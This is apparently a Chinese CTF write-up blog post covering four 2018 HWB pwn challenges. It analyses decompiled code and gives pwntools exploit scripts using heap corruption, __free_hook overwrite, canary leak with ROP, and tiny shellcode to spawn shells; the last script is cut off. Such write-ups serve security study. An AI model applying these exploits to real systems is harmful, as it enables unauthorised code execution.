    <content type="html"><![CDATA[<p>照例先放图：</p><p><img src="/img/hwb2018/0.png" alt=""></p><h2 id="gettingstart"><a href="#gettingstart" class="headerlink" title="gettingstart"></a>gettingstart</h2><p>签到题</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">'117.78.40.144'</span>, <span class="number">32671</span>)</span><br><span class="line"><span class="comment">#p = process('task_gettingStart_ktQeERc')</span></span><br><span class="line">p.send(<span class="string">'a'</span>*<span class="number">0x18</span> + p64(<span class="number">0x7FFFFFFFFFFFFFFF</span>) + p64(<span class="number">0x3FB999999999999A</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="shoppingcart"><a href="#shoppingcart" class="headerlink" title="shoppingcart"></a>shoppingcart</h2><h3 id="题目及漏洞分析"><a href="#题目及漏洞分析" class="headerlink" title="题目及漏洞分析"></a>题目及漏洞分析</h3><p>题目包含了两个结构体，money和good</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">00000000 money           struc ; (sizeof=0x10, mappedto_6)</span><br><span class="line">00000000 name            dq ?</span><br><span class="line">00000008 sum             dq ?</span><br><span class="line">00000010 money           ends</span><br><span class="line">00000010</span><br><span class="line">00000000 ; ---------------------------------------------------------------------------</span><br><span class="line">00000000</span><br><span class="line">00000000 good_chunk      struc ; (sizeof=0x10, mappedto_7)</span><br><span class="line">00000000 mem_ptr         dq ?</span><br><span class="line">00000008 sum             dq ?</span><br><span class="line">00000010 good_chunk      ends</span><br></pre></td></tr></table></figure><p>其中区别是money的name指向bss段，而good指向堆空间，二者的结构体都是通过malloc(0x10)得到的。</p><p>而在这个程序的bss段上，关于money_name、money_list、good_list的排布如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.bss:0000000000202090 bss_good_num    dq ?                    ; DATA XREF: add+17↑r</span><br><span class="line">.bss:0000000000202090                                         ; add+E1↑r ...</span><br><span class="line">.bss:0000000000202098 bss_num         dq ?                    ; DATA XREF: getmoney+8↑r</span><br><span class="line">.bss:00000000002020A0 ; char bss_name[160]</span><br><span class="line">.bss:00000000002020A0 bss_name        db 0A0h dup(?)          ; DATA XREF: getmoney+62↑o</span><br><span class="line">.bss:0000000000202140 bss_list        dd ?                    ; DATA XREF: </span><br><span class="line">.bss:00000000002021E0 ; void **bss_good_list[20]</span><br><span class="line">.bss:00000000002021E0 bss_good_list   dq 14h dup(?)           ; DATA XREF: add+FB↑o</span><br><span class="line">.bss:00000000002021E0                                         ; free_chunk+24↑o ...</span><br></pre></td></tr></table></figure><p>题目提供了对money的add功能。对good的add、edit、free功能。</p><p>而漏洞在于edit函数中，其中缺少对修改偏移的check，这个位置存在整数溢出漏洞。当可以找到一个位置满足题目中定义的这种链式结构就可以达到任意内存写。</p><p>并且可以注意到此处写0时存在一个null-off-by-one。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">edit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v0; <span class="comment">// rax</span></span><br><span class="line">  __int64 v1; <span class="comment">// ST00_8</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+10h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v4; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Which goods you need to modify?"</span>);</span><br><span class="line">  fgets(&amp;s, <span class="number">0x18</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  v0 = strtoul(&amp;s, <span class="number">0L</span>L, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"OK, what would you like to modify %s to?\n"</span>, *bss_good_list[v0], v0);</span><br><span class="line">  *((_BYTE *)*bss_good_list[v1] + read(<span class="number">0</span>, *bss_good_list[v1], <span class="number">8u</span>LL)) = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>另外，在add()函数中，当malloc(0)时，会返回一个0x20的块，并且向mem_ptr-1的位置，即size写入\0，而不影响堆块内存中原有的数据。这样当malloc(0)的堆块是从unsorted bin中分出来的，就存在脏数据来泄露libc地址。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">add</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int64 size; <span class="comment">// ST10_8</span></span><br><span class="line">  good_chunk *good_ptr; <span class="comment">// ST18_8</span></span><br><span class="line">  __int64 v2; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+20h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int64)bss_good_num &lt;= <span class="number">0x13</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"How long is your goods name?"</span>);</span><br><span class="line">    fgets(&amp;s, <span class="number">24</span>, <span class="built_in">stdin</span>);</span><br><span class="line">    size = strtoul(&amp;s, <span class="number">0L</span>L, <span class="number">0</span>);</span><br><span class="line">    good_ptr = (good_chunk *)<span class="built_in">malloc</span>(<span class="number">0x10</span>uLL);</span><br><span class="line">    good_ptr-&gt;sum = <span class="number">999L</span>L;</span><br><span class="line">    good_ptr-&gt;mem_ptr = (__int64)<span class="built_in">malloc</span>(size);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"What is your goods name?"</span>);</span><br><span class="line">    *(_BYTE *)((<span class="keyword">signed</span> <span class="keyword">int</span>)read(<span class="number">0</span>, (<span class="keyword">void</span> *)good_ptr-&gt;mem_ptr, size) - <span class="number">1L</span>L + good_ptr-&gt;mem_ptr) = <span class="number">0</span>;</span><br><span class="line">    v2 = bss_good_num++;</span><br><span class="line">    bss_good_list[v2] = (<span class="keyword">void</span> **)good_ptr;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Your shopping cart is full now!"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>我想我这种利用方法大概是一种非预期（？），虽然很复杂。。</p><p>首先，将money填满（共20个），这样money_name和money_list两块就会相连，然后编辑最后一个money，会导致一位溢出，使得第一个money_list最低位被赋值为0，即堆空间指向低地址。</p><p>未覆盖前如下图：</p><p><img src="/img/hwb2018/1.png" alt=""></p><p>覆盖后如下图：</p><p><img src="/img/hwb2018/2.png" alt=""></p><p>而这块内存指向哪里呢？</p><p><img src="/img/hwb2018/3.png" alt=""></p><p>指向一个大小为0x1010的内存块里，这个内存块是什么呢？</p><p>由于题目中没有setvbuf，又用了fgets，这个内存块是stdin的缓冲区</p><p>如果对IO知识有一定了解就会知道，fgets并不是安装其参数的大小调用read函数，具体可以参考<a href="https://www.anquanke.com/post/id/86945" target="_blank" rel="noopener">https://www.anquanke.com/post/id/86945</a></p><p>因此，如果我们在fgets时输入超长的字符串的话，不但可以控制程序执行流，还可以将money<em>list所指向的内存置为\</em>_free_hook，这样就可以将其劫持为system，在释放时可以触发system(“/bin/sh”)。</p><p>远程时，这个堆块并不是0x1010，调试这个大小花了很多功夫….所以我想应该算是一种非预期解法吧。</p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">debug=<span class="number">1</span></span><br><span class="line">lib = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> lib==<span class="number">0</span>:</span><br><span class="line">libc_name = <span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span></span><br><span class="line">offset = <span class="number">0x230</span></span><br><span class="line">one_gadget = [<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf0274</span>,<span class="number">0xf1117</span>]</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">libc_name = <span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span></span><br><span class="line">offset = <span class="number">0x260</span></span><br><span class="line">one_gadget = [<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xef6c4</span>,<span class="number">0xf0567</span>]</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">elf = ELF(<span class="string">'./task_shoppingCart'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">p= process(<span class="string">'./task_shoppingCart'</span>)<span class="comment">#,env=&#123;'LD_PRELOAD' :libc_name&#125;)</span></span><br><span class="line"></span><br><span class="line">libc = ELF(libc_name)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote( <span class="string">'117.78.26.133'</span>, <span class="number">31666</span>)<span class="comment">#process('./pwn1')</span></span><br><span class="line">libc = ELF(libc_name)</span><br><span class="line">offset = <span class="number">0x230</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,name)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"Now, buy buy buy!"</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">"name?"</span>)</span><br><span class="line">p.sendline(str(size))</span><br><span class="line">p.recvuntil(<span class="string">"What is your goods name?"</span>)</span><br><span class="line">p.send(name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"Now, buy buy buy!"</span>)</span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Which goods that you don't need?"</span>)</span><br><span class="line">p.sendline(str(idx) )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"Now, buy buy buy!"</span>)</span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Which goods you need to modify?"</span>)</span><br><span class="line">p.sendline(str(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit_vul</span><span class="params">(context)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"Now, buy buy buy!"</span>)</span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Which goods you need to modify?"</span>)</span><br><span class="line">p.send(context)</span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">attach(p)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x13</span>):</span><br><span class="line">p.recvuntil(<span class="string">"EMMmmm, you will be a rich man!"</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">"I will give you $9999, but what's the  currency type you want, RMB or Dollar?"</span>)</span><br><span class="line">p.sendline(<span class="string">'a'</span>*<span class="number">8</span>)</span><br><span class="line">p.recvuntil(<span class="string">"EMMmmm, you will be a rich man!"</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">"I will give you $9999, but what's the  currency type you want, RMB or Dollar?"</span>)</span><br><span class="line">p.sendline(<span class="string">'b'</span>*<span class="number">8</span>)</span><br><span class="line">p.recvuntil(<span class="string">"EMMmmm, you will be a rich man!"</span>)</span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line"></span><br><span class="line">raw_input()</span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">'p4nda'</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x70</span>,<span class="string">'/bin/sh\0'</span>) <span class="comment">#1</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="string">''</span>)<span class="comment">#2</span></span><br><span class="line">edit(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'OK, what would you like to modify '</span>)</span><br><span class="line">libc_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\0'</span>))</span><br><span class="line">libc.address = libc_addr- <span class="number">0x10</span> - <span class="number">344</span> -libc.symbols[<span class="string">'__malloc_hook'</span>] </span><br><span class="line">p.send(<span class="string">'p4nda'</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+] leak'</span>,hex(libc_addr) </span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+] system'</span>,hex(libc.symbols[<span class="string">'system'</span>]) </span><br><span class="line"></span><br><span class="line">edit( (<span class="number">0x202140</span>+<span class="number">19</span>*<span class="number">8</span> - <span class="number">0x2021E0</span> )/<span class="number">8</span> &amp;<span class="number">0xffffffffffffffff</span> )</span><br><span class="line">p.recvuntil(<span class="string">'to?'</span>)</span><br><span class="line">p.send(<span class="string">'d'</span>*<span class="number">8</span>)</span><br><span class="line">raw_input()</span><br><span class="line">payload = (str((<span class="number">0x202140</span> - <span class="number">0x2021E0</span> )/<span class="number">8</span> &amp;<span class="number">0xffffffffffffffff</span>)+<span class="string">'\n'</span>) </span><br><span class="line"></span><br><span class="line">payload+= (str(<span class="number">2</span>)+<span class="string">'\n'</span>) </span><br><span class="line">payload+= (str(<span class="number">1</span>)+<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">payload = payload.ljust(<span class="number">0x1000</span><span class="number">-0x20</span>,<span class="string">'a'</span>)</span><br><span class="line">payload+= p64(libc.symbols[<span class="string">'__free_hook'</span>])</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>,<span class="string">'a'</span>)</span><br><span class="line">payload+= p64(libc.symbols[<span class="string">'__free_hook'</span>]) * <span class="number">0x60</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">edit_vul(payload)</span><br><span class="line">p.recvuntil(<span class="string">'to?'</span>)</span><br><span class="line">p.send(p64(libc.symbols[<span class="string">'system'</span>]))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="huwang"><a href="#huwang" class="headerlink" title="huwang"></a>huwang</h2><p>此题不是我做出的，贴一个w1tcher的EXP吧</p><h3 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">'amd64'</span>, os = <span class="string">'linux'</span>, endian = <span class="string">'little'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'split'</span>, <span class="string">'-h'</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sixsixsix</span><span class="params">(p, name, rd, secret, flag = <span class="number">1</span>)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt;&gt; \n'</span>)</span><br><span class="line">    p.sendline(<span class="string">'666'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'name\n'</span>)</span><br><span class="line">    p.send(name)</span><br><span class="line">    p.recvuntil(<span class="string">'secret?\n'</span>)</span><br><span class="line">    p.sendline(<span class="string">'y'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'secret:\n'</span>)</span><br><span class="line">    p.sendline(str(rd))</span><br><span class="line">    <span class="keyword">if</span> flag == <span class="number">1</span>:</span><br><span class="line">        p.recvuntil(<span class="string">'secret\n'</span>)</span><br><span class="line">        p.send(secret)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">GameStart</span><span class="params">(ip, port, debug)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> debug == <span class="number">1</span>:</span><br><span class="line">        p = process(<span class="string">'./huwang'</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p = remote(ip, port)</span><br><span class="line">    sixsixsix(p, <span class="string">'w1tcher'</span>, <span class="number">-1</span>, <span class="string">'w1tcher'</span>, <span class="number">0</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'timeout~'</span>)</span><br><span class="line">    <span class="keyword">if</span> debug == <span class="number">1</span>:</span><br><span class="line">        p = process(<span class="string">'./huwang'</span>, env = &#123;<span class="string">'LD_PRELOAD'</span> : <span class="string">'./libc.so.6'</span>&#125;)</span><br><span class="line">        gdb.attach(p, <span class="string">'b *0x040110D\nc'</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p = remote(ip, port)</span><br><span class="line">    libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line">    sixsixsix(p, <span class="string">'w1tcher'</span>.ljust(<span class="number">0x19</span>, <span class="string">'a'</span>), <span class="number">1</span>, <span class="string">'4ae71336e44bf9bf79d2752e234818a5'</span>.decode(<span class="string">'hex'</span>))</span><br><span class="line">    p.recvuntil(<span class="string">'w1tcher'</span>.ljust(<span class="number">0x19</span>, <span class="string">'a'</span>))</span><br><span class="line">    canary = u64(<span class="string">'\x00'</span> + p.recvn(<span class="number">7</span>))</span><br><span class="line">    p.recvuntil(<span class="string">'occupation?\n'</span>)</span><br><span class="line">    p.send(<span class="string">'a'</span> * <span class="number">0xff</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'[Y/N]\n'</span>)</span><br><span class="line">    p.sendline(<span class="string">'Y'</span>)</span><br><span class="line">    shellcode = <span class="string">'a'</span> * <span class="number">0x108</span> + p64(canary) + p64(<span class="number">0</span>)</span><br><span class="line">    shellcode += p64(<span class="number">0x0000000000401573</span>) + p64(<span class="number">0x0602F70</span>) + p64(<span class="number">0x40101C</span>)</span><br><span class="line">    p.send(shellcode)</span><br><span class="line">    p.recvuntil(<span class="string">'Congratulations, '</span>)</span><br><span class="line">    libc_addr = u64(p.recvn(<span class="number">6</span>) + <span class="string">'\x00'</span> * <span class="number">2</span>) - libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">    p.recvuntil(<span class="string">'occupation?\n'</span>)</span><br><span class="line">    p.send(<span class="string">'a'</span> * <span class="number">0xff</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'[Y/N]\n'</span>)</span><br><span class="line">    p.sendline(<span class="string">'Y'</span>)</span><br><span class="line">    shellcode = <span class="string">'a'</span> * <span class="number">0x108</span> + p64(canary) + p64(<span class="number">0</span>)</span><br><span class="line">    shellcode += p64(<span class="number">0x0000000000401573</span>) + p64(next(libc.search(<span class="string">'/bin/sh'</span>)) + libc_addr) + p64(libc_addr + libc.symbols[<span class="string">'system'</span>])</span><br><span class="line">    p.send(shellcode)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    GameStart(<span class="string">'117.78.26.79'</span>, <span class="number">31399</span>, <span class="number">1</span>)</span><br></pre></td></tr></table></figure><h2 id="six"><a href="#six" class="headerlink" title="six"></a>six</h2><p>此题恰好之前在看雪论坛上见到过类似的，并且还讨论并且复现了一下，所以就直接用之前的EXP打了，拿了2血。手速还是慢了，不知道是不是和我讨论的师傅拿了一血。</p><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p>题目就是一个6字节的shellcode。</p><p>其中，程序申请了两块0x1000的内存，分别用作栈和代码段：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">fd = open(<span class="string">"/dev/urandom"</span>, <span class="number">0</span>);</span><br><span class="line">read(fd, &amp;buf, <span class="number">6u</span>LL);</span><br><span class="line">read(fd, &amp;v3, <span class="number">6u</span>LL);</span><br><span class="line">dest = mmap((<span class="keyword">void</span> *)(v3 &amp; <span class="number">0xFFFFFFFFFFFFF000</span>LL), <span class="number">0x1000</span>uLL, <span class="number">7</span>, <span class="number">34</span>, <span class="number">-1</span>, <span class="number">0L</span>L);</span><br><span class="line">qword_202098 = (__int64)mmap((<span class="keyword">void</span> *)(buf &amp; <span class="number">0xFFFFFFFFFFFFF000</span>LL), <span class="number">0x1000</span>uLL, <span class="number">3</span>, <span class="number">34</span>, <span class="number">-1</span>, <span class="number">0L</span>L) + <span class="number">1280</span>;</span><br></pre></td></tr></table></figure><p>可以看到生成的方法是用/dev/urandom的随机数，第一次在看雪上看到这个生成方法时觉得二者是不可能连在一起的，但是当这两个地址冲突或者不符合条件时，mmap会随机分配这个地址，而当二者均随机分配时，则这两个地址是相连的。这个前提解决了很多问题，节省了很多指令。</p><p>而在执行shellcode时，预先将除rsp、rip其他寄存器全部置零了，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">=&gt; 0x7f90763a4000:mov    rsp,rdi</span><br><span class="line">   0x7f90763a4003:xor    rbp,rbp</span><br><span class="line">   0x7f90763a4006:xor    rax,rax</span><br><span class="line">   0x7f90763a4009:xor    rbx,rbx</span><br><span class="line">   0x7f90763a400c:xor    rcx,rcx</span><br><span class="line">   0x7f90763a400f:xor    rdx,rdx</span><br><span class="line">   0x7f90763a4012:xor    rdi,rdi</span><br><span class="line">   0x7f90763a4015:xor    rsi,rsi</span><br><span class="line">   0x7f90763a4018:xor    r8,r8</span><br><span class="line">   0x7f90763a401b:xor    r9,r9</span><br><span class="line">   0x7f90763a401e:xor    r10,r10</span><br><span class="line">   0x7f90763a4021:xor    r11,r11</span><br><span class="line">   0x7f90763a4024:xor    r12,r12</span><br><span class="line">   0x7f90763a4027:xor    r13,r13</span><br><span class="line">   0x7f90763a402a:xor    r14,r14</span><br><span class="line">   0x7f90763a402d:xor    r15,r15</span><br></pre></td></tr></table></figure><p>但当两块内存相连时，如果从rsp进行覆写的话，是可以覆写到代码段的。</p><p>因此shellcode如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0x7f90763a4030    push   rsp</span><br><span class="line">0x7f90763a4031    pop    rsi</span><br><span class="line">0x7f90763a4032    mov    edx, esi</span><br><span class="line">0x7f90763a4034    syscall</span><br></pre></td></tr></table></figure><p>如此，便可以从栈上向代码段一直写入，直到写入现在的RIP，将后续指令写为shellcraftsh()</p><h3 id="EXP-2"><a href="#EXP-2" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p =process(<span class="string">'./six'</span>)</span><br><span 